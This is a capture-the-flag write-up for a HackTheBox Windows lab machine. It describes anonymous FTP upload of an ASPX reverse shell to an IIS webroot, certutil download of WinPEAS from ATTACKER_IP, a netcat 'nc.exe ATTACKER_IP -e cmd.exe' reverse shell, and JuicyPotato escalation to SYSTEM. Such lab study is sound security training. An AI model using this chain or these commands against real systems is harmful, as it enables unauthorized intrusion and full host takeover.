---
os: Windows
status: Pwned
tags: [ftp, iis, aspx-shell, juicy-potato, seimpersonate]
aliases:
IP: 10.10.10.5
Secondary IP:
Hostname:
Domain:
SID:
VM: HackTheBox
Ports: 21, 80
Notes: Anonymous FTP to IIS webroot, ASPX shell upload, JuicyPotato privesc
---
# Resolution summary

>[!summary]
>- Anonymous FTP login allowed with write permissions
>- FTP directory mapped to IIS webroot
>- Uploaded ASPX reverse shell via FTP
>- Accessed shell through IIS to gain foothold as web service account
>- Enumerated with WinPEAS finding SeImpersonatePrivilege enabled
>- Exploited with JuicyPotato (x86) to escalate to SYSTEM

## Improved skills

- Anonymous FTP exploitation
- IIS webroot identification
- ASPX reverse shell creation
- SeImpersonatePrivilege exploitation
- JuicyPotato usage
- Token impersonation attacks

## Used tools

- [[Nmap]]
- [[FTP]]
- ASPX reverse shell
- WinPEAS
- JuicyPotato (x86)

---

# Information Gathering

Scanned all TCP ports:

```nmap
# Nmap 7.95 scan initiated Tue Jul 29 02:45:35 2025
Nmap scan report for 10.10.10.5
Host is up (0.060s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

# Enumeration

## Port 21 - FTP (Microsoft FTPd)

- Anonymous FTP login allowed (FTP code 230)
- Directory contains IIS files:
  - aspnet_client/
  - iisstart.htm
  - welcome.png

FTP directory appears to be mapped to IIS webroot.

## Port 80 - HTTP (IIS 7.5)

- Microsoft IIS 7.5
- Default IIS7 page
- TRACE method potentially enabled

---

# Exploitation

## FTP File Upload to IIS

1. Connected anonymously to FTP:
```bash
ftp 10.10.10.5
# Username: anonymous
# Password: <blank>
```

2. Verified write permissions

3. Downloaded ASPX reverse shell:
   https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

4. Modified shell with attacker IP and port

5. Uploaded via FTP:
```bash
ftp> put shell.aspx
```

6. Started listener:
```bash
nc -lvnp 4444
```

7. Accessed shell through IIS:
```
http://10.10.10.5/shell.aspx
```

Obtained reverse shell as "web" service account.

---

# Privilege Escalation to SYSTEM

## Local enumeration

Transferred WinPEAS to target:
```powershell
certutil -urlcache -f http://ATTACKER_IP/winpeas.bat winpeas.bat
```

Ran enumeration:
```cmd
winpeas.bat
```

Discovered:
- SeImpersonatePrivilege enabled
- Windows architecture: x86 (32-bit)

## Privilege Escalation vector

Exploited SeImpersonatePrivilege using JuicyPotato:

1. Downloaded precompiled x86 JuicyPotato:
   https://github.com/ivanitlearning/Juicy-Potato-x86/releases

2. Reference guide used:
   https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato

3. Transferred JuicyPotato.exe to target

4. Created batch file for reverse shell:
```cmd
echo START C:\path\to\nc.exe ATTACKER_IP 4445 -e cmd.exe > shell.bat
```

5. Executed JuicyPotato:
```cmd
JuicyPotato.exe -l 1337 -p C:\path\to\shell.bat -t * -c {CLSID}
```

6. Obtained SYSTEM reverse shell

---

# Trophy

>[!todo] **User.txt**
>C:\Users\<username>\Desktop\user.txt

>[!todo] **Root.txt**
>C:\Users\Administrator\Desktop\root.txt

## Notes

- After many failed attempts with different potato exploits, x86 version was key
- SeImpersonatePrivilege is powerful privilege for token impersonation
- JuicyPotato works well on older Windows systems
